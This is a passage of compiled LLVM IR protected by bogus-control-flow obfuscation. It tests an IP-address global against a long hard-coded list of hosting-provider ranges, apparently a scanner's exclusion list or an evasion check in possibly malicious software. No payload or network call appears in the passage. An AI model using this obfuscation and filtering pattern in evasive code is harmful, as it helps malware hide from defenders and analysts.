  %2835 = icmp eq i32 %2834, 0
  %2836 = icmp slt i32 %2831, 10
  %2837 = or i1 %2835, %2836
  br i1 %2837, label %originalBBpart2380, label %originalBB378alteredBB

originalBBpart2380:                               ; preds = %originalBB378
  br i1 %2829, label %5042, label %2838

; <label>:2838:                                   ; preds = %originalBBpart2380, %2814, %2810, %2806
  %2839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2840 = zext i8 %2839 to i32
  %2841 = icmp eq i32 %2840, 209
  br i1 %2841, label %2842, label %2870

; <label>:2842:                                   ; preds = %2838
  %2843 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2844 = zext i8 %2843 to i32
  %2845 = icmp eq i32 %2844, 222
  br i1 %2845, label %2846, label %2870

; <label>:2846:                                   ; preds = %2842
  %2847 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2848 = zext i8 %2847 to i32
  %2849 = icmp sge i32 %2848, 1
  br i1 %2849, label %2850, label %2870

; <label>:2850:                                   ; preds = %2846
  %2851 = load i32, i32* @x.71
  %2852 = load i32, i32* @y.72
  %2853 = sub i32 %2851, 1
  %2854 = mul i32 %2851, %2853
  %2855 = urem i32 %2854, 2
  %2856 = icmp eq i32 %2855, 0
  %2857 = icmp slt i32 %2852, 10
  %2858 = or i1 %2856, %2857
  br i1 %2858, label %originalBB382, label %originalBB382alteredBB

originalBB382:                                    ; preds = %originalBB382alteredBB, %2850
  %2859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2860 = zext i8 %2859 to i32
  %2861 = icmp slt i32 %2860, 31
  %2862 = load i32, i32* @x.71
  %2863 = load i32, i32* @y.72
  %2864 = sub i32 %2862, 1
  %2865 = mul i32 %2862, %2864
  %2866 = urem i32 %2865, 2
  %2867 = icmp eq i32 %2866, 0
  %2868 = icmp slt i32 %2863, 10
  %2869 = or i1 %2867, %2868
  br i1 %2869, label %originalBBpart2384, label %originalBB382alteredBB

originalBBpart2384:                               ; preds = %originalBB382
  br i1 %2861, label %5042, label %2870

; <label>:2870:                                   ; preds = %originalBBpart2384, %2846, %2842, %2838
  %2871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2872 = zext i8 %2871 to i32
  %2873 = icmp eq i32 %2872, 208
  br i1 %2873, label %2874, label %2902

; <label>:2874:                                   ; preds = %2870
  %2875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2876 = zext i8 %2875 to i32
  %2877 = icmp eq i32 %2876, 167
  br i1 %2877, label %2878, label %2902

; <label>:2878:                                   ; preds = %2874
  %2879 = load i32, i32* @x.71
  %2880 = load i32, i32* @y.72
  %2881 = sub i32 %2879, 1
  %2882 = mul i32 %2879, %2881
  %2883 = urem i32 %2882, 2
  %2884 = icmp eq i32 %2883, 0
  %2885 = icmp slt i32 %2880, 10
  %2886 = or i1 %2884, %2885
  br i1 %2886, label %originalBB386, label %originalBB386alteredBB

originalBB386:                                    ; preds = %originalBB386alteredBB, %2878
  %2887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2888 = zext i8 %2887 to i32
  %2889 = icmp sge i32 %2888, 232
  %2890 = load i32, i32* @x.71
  %2891 = load i32, i32* @y.72
  %2892 = sub i32 %2890, 1
  %2893 = mul i32 %2890, %2892
  %2894 = urem i32 %2893, 2
  %2895 = icmp eq i32 %2894, 0
  %2896 = icmp slt i32 %2891, 10
  %2897 = or i1 %2895, %2896
  br i1 %2897, label %originalBBpart2388, label %originalBB386alteredBB

originalBBpart2388:                               ; preds = %originalBB386
  br i1 %2889, label %2898, label %2902

; <label>:2898:                                   ; preds = %originalBBpart2388
  %2899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2900 = zext i8 %2899 to i32
  %2901 = icmp slt i32 %2900, 252
  br i1 %2901, label %5042, label %2902

; <label>:2902:                                   ; preds = %2898, %originalBBpart2388, %2874, %2870
  %2903 = load i32, i32* @x.71
  %2904 = load i32, i32* @y.72
  %2905 = sub i32 %2903, 1
  %2906 = mul i32 %2903, %2905
  %2907 = urem i32 %2906, 2
  %2908 = icmp eq i32 %2907, 0
  %2909 = icmp slt i32 %2904, 10
  %2910 = or i1 %2908, %2909
  br i1 %2910, label %originalBB390, label %originalBB390alteredBB

originalBB390:                                    ; preds = %originalBB390alteredBB, %2902
  %2911 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2912 = zext i8 %2911 to i32
  %2913 = icmp eq i32 %2912, 66
  %2914 = load i32, i32* @x.71
  %2915 = load i32, i32* @y.72
  %2916 = sub i32 %2914, 1
  %2917 = mul i32 %2914, %2916
  %2918 = urem i32 %2917, 2
  %2919 = icmp eq i32 %2918, 0
  %2920 = icmp slt i32 %2915, 10
  %2921 = or i1 %2919, %2920
  br i1 %2921, label %originalBBpart2392, label %originalBB390alteredBB

originalBBpart2392:                               ; preds = %originalBB390
  br i1 %2913, label %2922, label %2934

; <label>:2922:                                   ; preds = %originalBBpart2392
  %2923 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2924 = zext i8 %2923 to i32
  %2925 = icmp eq i32 %2924, 55
  br i1 %2925, label %2926, label %2934

; <label>:2926:                                   ; preds = %2922
  %2927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2928 = zext i8 %2927 to i32
  %2929 = icmp sge i32 %2928, 128
  br i1 %2929, label %2930, label %2934

; <label>:2930:                                   ; preds = %2926
  %2931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2932 = zext i8 %2931 to i32
  %2933 = icmp slt i32 %2932, 159
  br i1 %2933, label %5042, label %2934

; <label>:2934:                                   ; preds = %2930, %2926, %2922, %originalBBpart2392
  %2935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2936 = zext i8 %2935 to i32
  %2937 = icmp eq i32 %2936, 45
  br i1 %2937, label %2938, label %2950

; <label>:2938:                                   ; preds = %2934
  %2939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2940 = zext i8 %2939 to i32
  %2941 = icmp eq i32 %2940, 63
  br i1 %2941, label %2942, label %2950

; <label>:2942:                                   ; preds = %2938
  %2943 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2944 = zext i8 %2943 to i32
  %2945 = icmp sge i32 %2944, 1
  br i1 %2945, label %2946, label %2950

; <label>:2946:                                   ; preds = %2942
  %2947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2948 = zext i8 %2947 to i32
  %2949 = icmp slt i32 %2948, 127
  br i1 %2949, label %5042, label %2950

; <label>:2950:                                   ; preds = %2946, %2942, %2938, %2934
  %2951 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2952 = zext i8 %2951 to i32
  %2953 = icmp eq i32 %2952, 216
  br i1 %2953, label %2954, label %2982

; <label>:2954:                                   ; preds = %2950
  %2955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2956 = zext i8 %2955 to i32
  %2957 = icmp eq i32 %2956, 237
  br i1 %2957, label %2958, label %2982

; <label>:2958:                                   ; preds = %2954
  %2959 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2960 = zext i8 %2959 to i32
  %2961 = icmp sge i32 %2960, 128
  br i1 %2961, label %2962, label %2982

; <label>:2962:                                   ; preds = %2958
  %2963 = load i32, i32* @x.71
  %2964 = load i32, i32* @y.72
  %2965 = sub i32 %2963, 1
  %2966 = mul i32 %2963, %2965
  %2967 = urem i32 %2966, 2
  %2968 = icmp eq i32 %2967, 0
  %2969 = icmp slt i32 %2964, 10
  %2970 = or i1 %2968, %2969
  br i1 %2970, label %originalBB394, label %originalBB394alteredBB

originalBB394:                                    ; preds = %originalBB394alteredBB, %2962
  %2971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2972 = zext i8 %2971 to i32
  %2973 = icmp slt i32 %2972, 159
  %2974 = load i32, i32* @x.71
  %2975 = load i32, i32* @y.72
  %2976 = sub i32 %2974, 1
  %2977 = mul i32 %2974, %2976
  %2978 = urem i32 %2977, 2
  %2979 = icmp eq i32 %2978, 0
  %2980 = icmp slt i32 %2975, 10
  %2981 = or i1 %2979, %2980
  br i1 %2981, label %originalBBpart2396, label %originalBB394alteredBB

originalBBpart2396:                               ; preds = %originalBB394
  br i1 %2973, label %5042, label %2982

; <label>:2982:                                   ; preds = %originalBBpart2396, %2958, %2954, %2950
  %2983 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2984 = zext i8 %2983 to i32
  %2985 = icmp eq i32 %2984, 108
  br i1 %2985, label %2986, label %3006

; <label>:2986:                                   ; preds = %2982
  %2987 = load i32, i32* @x.71
  %2988 = load i32, i32* @y.72
  %2989 = sub i32 %2987, 1
  %2990 = mul i32 %2987, %2989
  %2991 = urem i32 %2990, 2
  %2992 = icmp eq i32 %2991, 0
  %2993 = icmp slt i32 %2988, 10
  %2994 = or i1 %2992, %2993
  br i1 %2994, label %originalBB398, label %originalBB398alteredBB

originalBB398:                                    ; preds = %originalBB398alteredBB, %2986
  %2995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2996 = zext i8 %2995 to i32
  %2997 = icmp eq i32 %2996, 61
  %2998 = load i32, i32* @x.71
  %2999 = load i32, i32* @y.72
  %3000 = sub i32 %2998, 1
  %3001 = mul i32 %2998, %3000
  %3002 = urem i32 %3001, 2
  %3003 = icmp eq i32 %3002, 0
  %3004 = icmp slt i32 %2999, 10
  %3005 = or i1 %3003, %3004
  br i1 %3005, label %originalBBpart2400, label %originalBB398alteredBB

originalBBpart2400:                               ; preds = %originalBB398
  br i1 %2997, label %5042, label %3006

; <label>:3006:                                   ; preds = %originalBBpart2400, %2982
  %3007 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3008 = zext i8 %3007 to i32
  %3009 = icmp eq i32 %3008, 45
  br i1 %3009, label %3010, label %3014

; <label>:3010:                                   ; preds = %3006
  %3011 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3012 = zext i8 %3011 to i32
  %3013 = icmp eq i32 %3012, 76
  br i1 %3013, label %5042, label %3014

; <label>:3014:                                   ; preds = %3010, %3006
  %3015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3016 = zext i8 %3015 to i32
  %3017 = icmp eq i32 %3016, 185
  br i1 %3017, label %3018, label %3062

; <label>:3018:                                   ; preds = %3014
  %3019 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3020 = zext i8 %3019 to i32
  %3021 = icmp eq i32 %3020, 11
  br i1 %3021, label %3022, label %3062

; <label>:3022:                                   ; preds = %3018
  %3023 = load i32, i32* @x.71
  %3024 = load i32, i32* @y.72
  %3025 = sub i32 %3023, 1
  %3026 = mul i32 %3023, %3025
  %3027 = urem i32 %3026, 2
  %3028 = icmp eq i32 %3027, 0
  %3029 = icmp slt i32 %3024, 10
  %3030 = or i1 %3028, %3029
  br i1 %3030, label %originalBB402, label %originalBB402alteredBB

originalBB402:                                    ; preds = %originalBB402alteredBB, %3022
  %3031 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3032 = zext i8 %3031 to i32
  %3033 = icmp sge i32 %3032, 144
  %3034 = load i32, i32* @x.71
  %3035 = load i32, i32* @y.72
  %3036 = sub i32 %3034, 1
  %3037 = mul i32 %3034, %3036
  %3038 = urem i32 %3037, 2
  %3039 = icmp eq i32 %3038, 0
  %3040 = icmp slt i32 %3035, 10
  %3041 = or i1 %3039, %3040
  br i1 %3041, label %originalBBpart2404, label %originalBB402alteredBB

originalBBpart2404:                               ; preds = %originalBB402
  br i1 %3033, label %3042, label %3062

; <label>:3042:                                   ; preds = %originalBBpart2404
  %3043 = load i32, i32* @x.71
  %3044 = load i32, i32* @y.72
  %3045 = sub i32 %3043, 1
  %3046 = mul i32 %3043, %3045
  %3047 = urem i32 %3046, 2
  %3048 = icmp eq i32 %3047, 0
  %3049 = icmp slt i32 %3044, 10
  %3050 = or i1 %3048, %3049
  br i1 %3050, label %originalBB406, label %originalBB406alteredBB

originalBB406:                                    ; preds = %originalBB406alteredBB, %3042
  %3051 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3052 = zext i8 %3051 to i32
  %3053 = icmp slt i32 %3052, 148
  %3054 = load i32, i32* @x.71
  %3055 = load i32, i32* @y.72
  %3056 = sub i32 %3054, 1
  %3057 = mul i32 %3054, %3056
  %3058 = urem i32 %3057, 2
  %3059 = icmp eq i32 %3058, 0
  %3060 = icmp slt i32 %3055, 10
  %3061 = or i1 %3059, %3060
  br i1 %3061, label %originalBBpart2408, label %originalBB406alteredBB

originalBBpart2408:                               ; preds = %originalBB406
  br i1 %3053, label %5042, label %3062

; <label>:3062:                                   ; preds = %originalBBpart2408, %originalBBpart2404, %3018, %3014
  %3063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3064 = zext i8 %3063 to i32
  %3065 = icmp eq i32 %3064, 185
  br i1 %3065, label %3066, label %3094

; <label>:3066:                                   ; preds = %3062
  %3067 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3068 = zext i8 %3067 to i32
  %3069 = icmp eq i32 %3068, 56
  br i1 %3069, label %3070, label %3094

; <label>:3070:                                   ; preds = %3066
  %3071 = load i32, i32* @x.71
  %3072 = load i32, i32* @y.72
  %3073 = sub i32 %3071, 1
  %3074 = mul i32 %3071, %3073
  %3075 = urem i32 %3074, 2
  %3076 = icmp eq i32 %3075, 0
  %3077 = icmp slt i32 %3072, 10
  %3078 = or i1 %3076, %3077
  br i1 %3078, label %originalBB410, label %originalBB410alteredBB

originalBB410:                                    ; preds = %originalBB410alteredBB, %3070
  %3079 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3080 = zext i8 %3079 to i32
  %3081 = icmp sge i32 %3080, 21
  %3082 = load i32, i32* @x.71
  %3083 = load i32, i32* @y.72
  %3084 = sub i32 %3082, 1
  %3085 = mul i32 %3082, %3084
  %3086 = urem i32 %3085, 2
  %3087 = icmp eq i32 %3086, 0
  %3088 = icmp slt i32 %3083, 10
  %3089 = or i1 %3087, %3088
  br i1 %3089, label %originalBBpart2412, label %originalBB410alteredBB

originalBBpart2412:                               ; preds = %originalBB410
  br i1 %3081, label %3090, label %3094

; <label>:3090:                                   ; preds = %originalBBpart2412
  %3091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3092 = zext i8 %3091 to i32
  %3093 = icmp slt i32 %3092, 23
  br i1 %3093, label %5042, label %3094

; <label>:3094:                                   ; preds = %3090, %originalBBpart2412, %3066, %3062
  %3095 = load i32, i32* @x.71
  %3096 = load i32, i32* @y.72
  %3097 = sub i32 %3095, 1
  %3098 = mul i32 %3095, %3097
  %3099 = urem i32 %3098, 2
  %3100 = icmp eq i32 %3099, 0
  %3101 = icmp slt i32 %3096, 10
  %3102 = or i1 %3100, %3101
  br i1 %3102, label %originalBB414, label %originalBB414alteredBB

originalBB414:                                    ; preds = %originalBB414alteredBB, %3094
  %3103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3104 = zext i8 %3103 to i32
  %3105 = icmp eq i32 %3104, 185
  %3106 = load i32, i32* @x.71
  %3107 = load i32, i32* @y.72
  %3108 = sub i32 %3106, 1
  %3109 = mul i32 %3106, %3108
  %3110 = urem i32 %3109, 2
  %3111 = icmp eq i32 %3110, 0
  %3112 = icmp slt i32 %3107, 10
  %3113 = or i1 %3111, %3112
  br i1 %3113, label %originalBBpart2416, label %originalBB414alteredBB

originalBBpart2416:                               ; preds = %originalBB414
  br i1 %3105, label %3114, label %3126

; <label>:3114:                                   ; preds = %originalBBpart2416
  %3115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3116 = zext i8 %3115 to i32
  %3117 = icmp eq i32 %3116, 61
  br i1 %3117, label %3118, label %3126

; <label>:3118:                                   ; preds = %3114
  %3119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3120 = zext i8 %3119 to i32
  %3121 = icmp sge i32 %3120, 136
  br i1 %3121, label %3122, label %3126

; <label>:3122:                                   ; preds = %3118
  %3123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3124 = zext i8 %3123 to i32
  %3125 = icmp slt i32 %3124, 139
  br i1 %3125, label %5042, label %3126

; <label>:3126:                                   ; preds = %3122, %3118, %3114, %originalBBpart2416
  %3127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3128 = zext i8 %3127 to i32
  %3129 = icmp eq i32 %3128, 185
  br i1 %3129, label %3130, label %3158

; <label>:3130:                                   ; preds = %3126
  %3131 = load i32, i32* @x.71
  %3132 = load i32, i32* @y.72
  %3133 = sub i32 %3131, 1
  %3134 = mul i32 %3131, %3133
  %3135 = urem i32 %3134, 2
  %3136 = icmp eq i32 %3135, 0
  %3137 = icmp slt i32 %3132, 10
  %3138 = or i1 %3136, %3137
  br i1 %3138, label %originalBB418, label %originalBB418alteredBB

originalBB418:                                    ; preds = %originalBB418alteredBB, %3130
  %3139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3140 = zext i8 %3139 to i32
  %3141 = icmp eq i32 %3140, 62
  %3142 = load i32, i32* @x.71
  %3143 = load i32, i32* @y.72
  %3144 = sub i32 %3142, 1
  %3145 = mul i32 %3142, %3144
  %3146 = urem i32 %3145, 2
  %3147 = icmp eq i32 %3146, 0
  %3148 = icmp slt i32 %3143, 10
  %3149 = or i1 %3147, %3148
  br i1 %3149, label %originalBBpart2420, label %originalBB418alteredBB

originalBBpart2420:                               ; preds = %originalBB418
  br i1 %3141, label %3150, label %3158

; <label>:3150:                                   ; preds = %originalBBpart2420
  %3151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3152 = zext i8 %3151 to i32
  %3153 = icmp sge i32 %3152, 187
  br i1 %3153, label %3154, label %3158

; <label>:3154:                                   ; preds = %3150
  %3155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3156 = zext i8 %3155 to i32
  %3157 = icmp slt i32 %3156, 191
  br i1 %3157, label %5042, label %3158

; <label>:3158:                                   ; preds = %3154, %3150, %originalBBpart2420, %3126
  %3159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3160 = zext i8 %3159 to i32
  %3161 = icmp eq i32 %3160, 66
  br i1 %3161, label %3162, label %3190

; <label>:3162:                                   ; preds = %3158
  %3163 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3164 = zext i8 %3163 to i32
  %3165 = icmp eq i32 %3164, 150
  br i1 %3165, label %3166, label %3190

; <label>:3166:                                   ; preds = %3162
  %3167 = load i32, i32* @x.71
  %3168 = load i32, i32* @y.72
  %3169 = sub i32 %3167, 1
  %3170 = mul i32 %3167, %3169
  %3171 = urem i32 %3170, 2
  %3172 = icmp eq i32 %3171, 0
  %3173 = icmp slt i32 %3168, 10
  %3174 = or i1 %3172, %3173
  br i1 %3174, label %originalBB422, label %originalBB422alteredBB

originalBB422:                                    ; preds = %originalBB422alteredBB, %3166
  %3175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3176 = zext i8 %3175 to i32
  %3177 = icmp sge i32 %3176, 120
  %3178 = load i32, i32* @x.71
  %3179 = load i32, i32* @y.72
  %3180 = sub i32 %3178, 1
  %3181 = mul i32 %3178, %3180
  %3182 = urem i32 %3181, 2
  %3183 = icmp eq i32 %3182, 0
  %3184 = icmp slt i32 %3179, 10
  %3185 = or i1 %3183, %3184
  br i1 %3185, label %originalBBpart2424, label %originalBB422alteredBB

originalBBpart2424:                               ; preds = %originalBB422
  br i1 %3177, label %3186, label %3190

; <label>:3186:                                   ; preds = %originalBBpart2424
  %3187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3188 = zext i8 %3187 to i32
  %3189 = icmp slt i32 %3188, 215
  br i1 %3189, label %5042, label %3190

; <label>:3190:                                   ; preds = %3186, %originalBBpart2424, %3162, %3158
  %3191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3192 = zext i8 %3191 to i32
  %3193 = icmp eq i32 %3192, 66
  br i1 %3193, label %3194, label %3206

; <label>:3194:                                   ; preds = %3190
  %3195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3196 = zext i8 %3195 to i32
  %3197 = icmp eq i32 %3196, 151
  br i1 %3197, label %3198, label %3206

; <label>:3198:                                   ; preds = %3194
  %3199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3200 = zext i8 %3199 to i32
  %3201 = icmp sge i32 %3200, 137
  br i1 %3201, label %3202, label %3206

; <label>:3202:                                   ; preds = %3198
  %3203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3204 = zext i8 %3203 to i32
  %3205 = icmp slt i32 %3204, 139
  br i1 %3205, label %5042, label %3206

; <label>:3206:                                   ; preds = %3202, %3198, %3194, %3190
  %3207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3208 = zext i8 %3207 to i32
  %3209 = icmp eq i32 %3208, 64
  br i1 %3209, label %3210, label %3222

; <label>:3210:                                   ; preds = %3206
  %3211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3212 = zext i8 %3211 to i32
  %3213 = icmp eq i32 %3212, 94
  br i1 %3213, label %3214, label %3222

; <label>:3214:                                   ; preds = %3210
  %3215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3216 = zext i8 %3215 to i32
  %3217 = icmp sge i32 %3216, 237
  br i1 %3217, label %3218, label %3222

; <label>:3218:                                   ; preds = %3214
  %3219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3220 = zext i8 %3219 to i32
  %3221 = icmp slt i32 %3220, 255
  br i1 %3221, label %5042, label %3222

; <label>:3222:                                   ; preds = %3218, %3214, %3210, %3206
  %3223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3224 = zext i8 %3223 to i32
  %3225 = icmp eq i32 %3224, 63
  br i1 %3225, label %3226, label %3270

; <label>:3226:                                   ; preds = %3222
  %3227 = load i32, i32* @x.71
  %3228 = load i32, i32* @y.72
  %3229 = sub i32 %3227, 1
  %3230 = mul i32 %3227, %3229
  %3231 = urem i32 %3230, 2
  %3232 = icmp eq i32 %3231, 0
  %3233 = icmp slt i32 %3228, 10
  %3234 = or i1 %3232, %3233
  br i1 %3234, label %originalBB426, label %originalBB426alteredBB

originalBB426:                                    ; preds = %originalBB426alteredBB, %3226
  %3235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3236 = zext i8 %3235 to i32
  %3237 = icmp eq i32 %3236, 251
  %3238 = load i32, i32* @x.71
  %3239 = load i32, i32* @y.72
  %3240 = sub i32 %3238, 1
  %3241 = mul i32 %3238, %3240
  %3242 = urem i32 %3241, 2
  %3243 = icmp eq i32 %3242, 0
  %3244 = icmp slt i32 %3239, 10
  %3245 = or i1 %3243, %3244
  br i1 %3245, label %originalBBpart2428, label %originalBB426alteredBB

originalBBpart2428:                               ; preds = %originalBB426
  br i1 %3237, label %3246, label %3270

; <label>:3246:                                   ; preds = %originalBBpart2428
  %3247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3248 = zext i8 %3247 to i32
  %3249 = icmp sge i32 %3248, 19
  br i1 %3249, label %3250, label %3270

; <label>:3250:                                   ; preds = %3246
  %3251 = load i32, i32* @x.71
  %3252 = load i32, i32* @y.72
  %3253 = sub i32 %3251, 1
  %3254 = mul i32 %3251, %3253
  %3255 = urem i32 %3254, 2
  %3256 = icmp eq i32 %3255, 0
  %3257 = icmp slt i32 %3252, 10
  %3258 = or i1 %3256, %3257
  br i1 %3258, label %originalBB430, label %originalBB430alteredBB

originalBB430:                                    ; preds = %originalBB430alteredBB, %3250
  %3259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3260 = zext i8 %3259 to i32
  %3261 = icmp slt i32 %3260, 21
  %3262 = load i32, i32* @x.71
  %3263 = load i32, i32* @y.72
  %3264 = sub i32 %3262, 1
  %3265 = mul i32 %3262, %3264
  %3266 = urem i32 %3265, 2
  %3267 = icmp eq i32 %3266, 0
  %3268 = icmp slt i32 %3263, 10
  %3269 = or i1 %3267, %3268
  br i1 %3269, label %originalBBpart2432, label %originalBB430alteredBB

originalBBpart2432:                               ; preds = %originalBB430
  br i1 %3261, label %5042, label %3270

; <label>:3270:                                   ; preds = %originalBBpart2432, %3246, %originalBBpart2428, %3222
  %3271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3272 = zext i8 %3271 to i32
  %3273 = icmp eq i32 %3272, 70
  br i1 %3273, label %3274, label %3286

; <label>:3274:                                   ; preds = %3270
  %3275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3276 = zext i8 %3275 to i32
  %3277 = icmp eq i32 %3276, 42
  br i1 %3277, label %3278, label %3286

; <label>:3278:                                   ; preds = %3274
  %3279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3280 = zext i8 %3279 to i32
  %3281 = icmp sge i32 %3280, 73
  br i1 %3281, label %3282, label %3286

; <label>:3282:                                   ; preds = %3278
  %3283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3284 = zext i8 %3283 to i32
  %3285 = icmp slt i32 %3284, 75
  br i1 %3285, label %5042, label %3286

; <label>:3286:                                   ; preds = %3282, %3278, %3274, %3270
  %3287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3288 = zext i8 %3287 to i32
  %3289 = icmp eq i32 %3288, 74
  br i1 %3289, label %3290, label %3318

; <label>:3290:                                   ; preds = %3286
  %3291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3292 = zext i8 %3291 to i32
  %3293 = icmp eq i32 %3292, 91
  br i1 %3293, label %3294, label %3318

; <label>:3294:                                   ; preds = %3290
  %3295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3296 = zext i8 %3295 to i32
  %3297 = icmp sge i32 %3296, 113
  br i1 %3297, label %3298, label %3318

; <label>:3298:                                   ; preds = %3294
  %3299 = load i32, i32* @x.71
  %3300 = load i32, i32* @y.72
  %3301 = sub i32 %3299, 1
  %3302 = mul i32 %3299, %3301
  %3303 = urem i32 %3302, 2
  %3304 = icmp eq i32 %3303, 0
  %3305 = icmp slt i32 %3300, 10
  %3306 = or i1 %3304, %3305
  br i1 %3306, label %originalBB434, label %originalBB434alteredBB

originalBB434:                                    ; preds = %originalBB434alteredBB, %3298
